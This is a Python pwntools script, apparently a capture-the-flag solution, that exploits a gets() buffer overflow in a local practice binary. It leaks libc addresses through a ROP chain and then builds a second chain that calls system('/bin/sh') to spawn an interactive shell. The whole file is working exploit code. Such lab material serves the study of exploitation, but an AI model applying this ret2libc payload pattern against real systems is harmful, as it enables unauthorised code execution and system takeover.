from pwn import *

context.binary = binary = ELF("./ret2libc", checksec = False)
'''
context.log_level = "debug"
'''

pop_rdi_gadget = p64(0x00000000004011de)

ret = p64(0x000000000040101a)

main_addr = p64(binary.symbols.main)
plt_puts_addr = p64(0x00401090)
got_puts_addr = p64(0x00404018)
got_fopen_addr = p64(0x00404038)
got_fwrite_addr = p64(0x00404040)
got_gets_addr = p64(0x00404030)

'''
gets reads from addressm 0x28
use buffer overflow to hijack execution flow
'''
payload = b"A" * 0x28
payload += pop_rdi_gadget + got_puts_addr + plt_puts_addr
payload += pop_rdi_gadget + got_fopen_addr + plt_puts_addr
payload += pop_rdi_gadget + got_fwrite_addr + plt_puts_addr
payload += pop_rdi_gadget + got_gets_addr + plt_puts_addr
payload += ret + main_addr

p = process()
p.sendline(payload)
output = p.recv().split(b"\n")


'''
output[0] and output[1] are the printed strings of the ret2libc file
'''
final_puts_addr = u64(output[2].ljust(8, b"\x00"))
final_fopen_addr = u64(output[3].ljust(8, b"\x00"))
final_fwrite_addr = u64(output[4].ljust(8, b"\x00"))
final_gets_addr = u64(output[5].ljust(8, b"\x00"))

print("Obtained puts addr: {}".format(str(hex(final_puts_addr))))
print("Obtained fopen addr: {}".format(str(hex(final_fopen_addr))))
print("Obtained fwrite addr: {}".format(str(hex(final_fwrite_addr))))
print("Obtained gets addr: {}".format(str(hex(final_gets_addr))))

str_bin_sh_offset = 0x1577c8
system_offset = 0x30170

payload = b"A" * 0x28
payload += ret + pop_rdi_gadget + p64(final_puts_addr + str_bin_sh_offset) + p64(final_puts_addr - system_offset)

p.sendline(payload)
p.interactive()
